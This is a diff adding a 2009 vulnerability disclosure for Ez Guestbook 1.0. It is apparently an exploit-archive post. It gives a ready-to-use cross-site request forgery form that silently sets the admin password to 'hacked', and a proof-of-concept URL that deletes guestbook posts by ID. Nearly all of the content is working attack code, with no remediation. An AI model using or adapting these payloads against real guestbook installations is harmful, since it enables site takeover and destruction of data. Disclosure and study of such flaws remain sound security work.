@@ -1,0 +1,49 @@
+[-------------------------------------------------------------------------------------------------]
+[   Title: Ez Guestbook 1.0 Multiple Vulnerabilities
+                           ]
+[   Author: Milos Zivanovic
+                           ]
+[   Email: milosz.security[at]gmail.com
+                           ]
+[   Date: 14. December 2009.
+                           ]
+[-------------------------------------------------------------------------------------------------]
+
+[-------------------------------------------------------------------------------------------------]
+[   Application: Ez Guestbook
+                           ]
+[   Version: 1.0
+                           ]
+[   Link: http://www.scriptsez.net/?action=details&cat=Guestbooks&id=11873094083
+                 ]
+[   Price: 10 USD
+                           ]
+[   Vulnerability: Cross Site Request Forgery
+                           ]
+[-------------------------------------------------------------------------------------------------]
+
+Ez Guestbook script version 1.0 suffers from multiple vulnerabilities:
+
+[#]Content
+ |--Change admin password
+ |--Remove post by ID
+
+[*]Change admin password
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ez_gb/admin.php?action=change_password"
+method="post">
+  <input type="hidden" name="admin_password" value="hacked">
+  <input type="hidden" name="c_admin_password" value="hacked">
+  <input type="hidden" name="add" value="true">
+  <input type="submit" name="submit" value=" CHANGE ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[+]Remove post by ID
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/ez_gb/admin.php?action=view&do=delete&id=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[----------------------------------------------EOF------------------------------------------------]
